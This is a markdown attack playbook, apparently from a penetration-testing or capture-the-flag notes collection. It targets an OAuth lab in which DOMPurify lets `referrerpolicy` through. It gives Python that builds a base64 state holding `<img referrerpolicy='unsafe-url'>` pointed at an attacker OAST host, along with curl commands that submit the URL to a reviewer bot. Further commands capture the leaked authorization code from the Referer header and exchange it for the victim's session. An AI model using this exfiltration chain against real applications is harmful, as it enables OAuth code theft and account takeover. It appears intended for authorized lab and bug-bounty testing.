# DOMPurify referrerpolicy OAuth State Referer Exfil

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- OAuth `state` is base64 JSON with a `message` field
- error page runs `DOMPurify.sanitize(message)` into `#message-container`
- DOMPurify config allows `referrerpolicy` on `IMG` / `A` / `IFRAME`
- failed OAuth keeps `code=` in `/error?code=...&state=...`
- reviewer bot visits OAuth URLs from `POST /report`
- `prompt=none` works against bot IdP session

Do **not** use when:

- sl2-style staged code works (`GET /auth` alone) — try CSRF first
- sl3 `/logger` postMessage channel exists — different chain
- sl4 Referer trust on missing-code `/callback` (plain hex state, no `/error`) — use `payloads/oauth/referer-trust-missing-code-callback-exfil-review-bot.md`

## Prerequisites

```bash
SL='https://[app-host]'
G='https://[idp-host]'

# 1. Get attacker token from homepage OAuth link
curl -sS -c /tmp/att.txt "$SL/" | grep -oP 'state=\K[^"&]+' | head -1 | python3 -c "
import sys, base64, json, urllib.parse
s=urllib.parse.unquote(sys.stdin.read().strip())
print(json.loads(base64.b64decode(s+'=='))['token'])
"
# save as TOKEN

# 2. OAST session
# curl POST ${L30_TOOLS_API_BASE}/oast/sessions ...
```

## Payload — exfil state (base64 JSON)

```python
import base64, json, time

def b64state(obj):
    return base64.b64encode(json.dumps(obj, separators=(',', ':')).encode()).decode()

OAST = 'https://[subdomain].oast.l30on.top/x'
TOKEN = '[attacker_token_from_homepage_state]'

exfil_state = b64state({
    'timestamp': int(time.time()),
    'status': 'ok',
    'token': TOKEN,
    'message': f'<img referrerpolicy="unsafe-url" src="{OAST}">'
})

clean_state = b64state({
    'timestamp': int(time.time()),
    'status': 'ok',
    'token': TOKEN,
    'message': ''
})
```

Alternative tags (test if `<img>` stripped):

```html
<iframe referrerpolicy="unsafe-url" src="https://[oast]/x"></iframe>
<a referrerpolicy="unsafe-url" href="https://[oast]/x">x</a>
```

## Report URL

```text
[G/idp]/o/oauth2/v2/auth?client_id=solo-leveling-1-client&redirect_uri=[urlencoded_callback]&response_type=code&scope=openid%20email%20profile&prompt=none&state=[EXFIL_STATE_B64]
```

```bash
OAUTH="${G}/o/oauth2/v2/auth?client_id=solo-leveling-1-client&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${SL}/callback'))")&response_type=code&scope=openid%20email%20profile&prompt=none&state=${EXFIL_STATE}"

curl -sS -b /tmp/att.txt -X POST "$SL/report" --data-urlencode "url=${OAUTH}"
```

## Capture + exchange

```bash
# Poll OAST; extract code= from Referer header

curl -sS -b /tmp/att.txt "$SL/callback?code=${STOLEN}&state=${CLEAN_STATE}" -L
curl -sS -b /tmp/att.txt "$SL/profile"
```

**Important:** exchange with `clean_state` (empty `message`), not exfil state.

## Expected signal

- OAST: `Referer: https://[app]/error?code=...&state=...`
- Profile: **Statue of God** (lab reviewer identity)

## Why it works

Non-empty `message` routes valid codes to error page. DOMPurify preserves `referrerpolicy="unsafe-url"`. Browser subresource load leaks full error URL via Referer. Attacker exchanges stolen code with clean state sharing same `token`.

## Solo Leveling sl1 constants

| Item | Value |
|------|-------|
| `client_id` | `solo-leveling-1-client` |
| Cookies | `oauth_token`, `connect.sid` |
| State format | base64 JSON (`timestamp`, `status`, `token`, `message`) |
| IdP | `https://google-[instance-id].pwnbox-lab.com` |

## Related

- `notes/dompurify-referrerpolicy-oauth-state-referer-leak.md`
- `writeups/solo-leveling-htmli-gate-oauth-referrer-leak.md`
- `labs/2026-07-11-solo-leveling-htmli-gate-oauth-referrer-leak.md`
